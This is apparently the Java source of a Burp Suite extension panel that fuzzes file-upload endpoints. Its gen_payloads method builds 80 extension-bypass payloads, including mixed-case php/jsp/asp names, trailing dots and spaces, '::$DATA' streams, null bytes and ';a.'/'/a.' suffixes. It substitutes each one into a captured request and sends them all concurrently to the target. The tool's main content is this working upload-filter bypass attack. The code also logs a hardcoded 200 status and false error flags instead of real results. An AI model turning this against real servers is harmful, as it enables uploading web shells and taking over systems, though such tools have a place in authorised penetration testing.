package burp;
import javax.swing.*;
import javax.swing.table.TableModel;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;
import java.io.PrintWriter;
import javax.swing.table.DefaultTableModel;

import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;


public class AttackPanel extends JTabbedPane{
    IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    PrintWriter stdout;
    private String host;
    private int port;
    private byte[] content;
    private int[] pos;
    private byte[][] payloads;

    private JSplitPane splitPane;
    public IMessageEditor requestViewer;
    public IMessageEditor responseViewer;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;

    private int num = 0;
    Vector<Vector<Object>> data = new Vector<Vector<Object>>();
    private Table logTable;

    public AttackPanel(String _host,int _port,byte[] _content,int[] _pos, IBurpExtenderCallbacks cb) {
        callbacks = cb;
        helpers = callbacks.getHelpers();
        stdout = new PrintWriter(callbacks.getStdout(), true);
        host = _host;
        port = _port;
        content = _content;
        pos = _pos;
        initComponents();
        gen_payloads();
    }

    private void initComponents() {
        splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        Vector<String> col_name = new Vector<String>();
        col_name.add("Request");
        col_name.add("Payload");
        col_name.add("Status");
        col_name.add("Error");
        col_name.add("Timeout");
        col_name.add("Length");

        DefaultTableModel model = new DefaultTableModel(data, col_name){
            public boolean isCellEditable(int row, int column)
            {
                return false;
            }
            @Override
            public Class<?> getColumnClass(int col) {
                if(col == 3 || col==4){
                    return Boolean.class;
                }
                return super.getColumnClass(col);
            }
        };
        logTable = new Table(model);
        logTable.setSelectionBackground(new Color(255,197,153));
        logTable.getSelectionModel().setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        logTable.setColumnSelectionAllowed(false);
        logTable.setRowSelectionAllowed(true);
        //logTable.setBackground(Color.WHITE);
        JCheckBox jc1 = new JCheckBox();
        JCheckBox jc2 = new JCheckBox();
        logTable.getColumnModel().getColumn(3).setCellEditor(new DefaultCellEditor(jc1));
        logTable.getColumnModel().getColumn(4).setCellEditor(new DefaultCellEditor(jc2));
        JScrollPane scrollPane = new JScrollPane(logTable);
        scrollPane.setPreferredSize(new Dimension(0,200));
        splitPane.setLeftComponent(scrollPane);


        JTabbedPane tabs = new JTabbedPane();
        requestViewer = callbacks.createMessageEditor(null,false);
        responseViewer = callbacks.createMessageEditor(null,false);
        tabs.addTab("Request", requestViewer.getComponent());
        tabs.addTab("Response", responseViewer.getComponent());
        splitPane.setRightComponent(tabs);

        this.add(splitPane,"Result");
        JPanel target = new JPanel();
        this.add(target,"Target");
        JPanel positions = new JPanel();
        this.add(positions,"Positions");
    }

    public static byte[] Replace(byte[] source, int[] _pos, byte[] s){
        byte[] target = new byte[source.length-(_pos[1]-_pos[0])+s.length];
        for(int i = 0,j=0; i < source.length; i++){
            if( i==_pos[0]){
                System.arraycopy(s,0,target,i,s.length);
                i += _pos[1]-_pos[0]-1;
                j += s.length;
            }
            else{
                target[j++] = source[i];
            }
        }
        return target;
    }

    public void start()
    {
        ExecutorService pool = Executors.newFixedThreadPool(5);
        for(int i=0;i<payloads.length;i++){
            Thread th = new Thread(new Attacker(payloads[i],i));
            pool.execute(th);
        }
        pool.shutdown();
        logTable.updateUI();
    }

    public static byte[] subBytes(byte[] src, int begin, int count) {
        byte[] bs = new byte[count];
        System.arraycopy(src, begin, bs, 0, count);
        return bs;
    }

    private void gen_payloads()
    {
        String suffix = helpers.bytesToString(subBytes(content,pos[0]+1,pos[1]-pos[0]-2));
        String[] exts = {"php","PhP","jsp","JsP","asp","AsP","aspx","AsPx","html","HtmL"};
        payloads = new byte[80][];
        int j=0;
        //payloads[j++] = helpers.stringToBytes("");
        for(int i=0;i<exts.length;i++){
            payloads[j++] = helpers.stringToBytes(exts[i]);
            payloads[j++] = helpers.stringToBytes(exts[i]+".");
            payloads[j++] = helpers.stringToBytes(exts[i]+" ");
            payloads[j++] = helpers.stringToBytes(exts[i]+"::$DATA");
            payloads[j++] = helpers.stringToBytes(exts[i]+"/.");
            payloads[j++] = helpers.stringToBytes(exts[i]+(char)0+"."+suffix);
            payloads[j++] = helpers.stringToBytes(exts[i]+";a."+suffix);
            payloads[j++] = helpers.stringToBytes(exts[i]+"/a."+suffix);
        }
    }

    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.request, true);
            responseViewer.setMessage(logEntry.response, false);

            super.changeSelection(row, col, toggle, extend);
        }
    }

    private static class LogEntry
    {
        final int index;
        final String payload;
        final int status;
        final boolean error;
        final boolean timeout;
        final int length;
        final byte[] request;
        final byte[] response;

        LogEntry(int index, String payload, int status,boolean error,boolean timeout,int length,byte[] request,byte[] response)
        {
            this.index = index;
            this.payload = payload;
            this.status = status;
            this.error = error;
            this.timeout = timeout;
            this.length = length;
            this.request = request;
            this.response = response;
        }
    }
    class Attacker implements Runnable {
        public byte[] payload;
        private int i;
        public Attacker(byte[] p,int _i){
            i = _i;
            payload = p;
        }
        public void run() {
            byte[] req = Replace(content,pos,payload);
            byte[] response = callbacks.makeHttpRequest(host, port, true,req);
            Vector row = new Vector();
            row.add(num);
            row.add(helpers.bytesToString(payload));
            row.add(200);
            row.add(false);
            row.add(false);
            row.add(response.length);
            data.add(row);
            log.add(new LogEntry (num++, "payload",200,false,false,response.length,req,response));
            if(i%5==0)logTable.updateUI();
        }
    }
}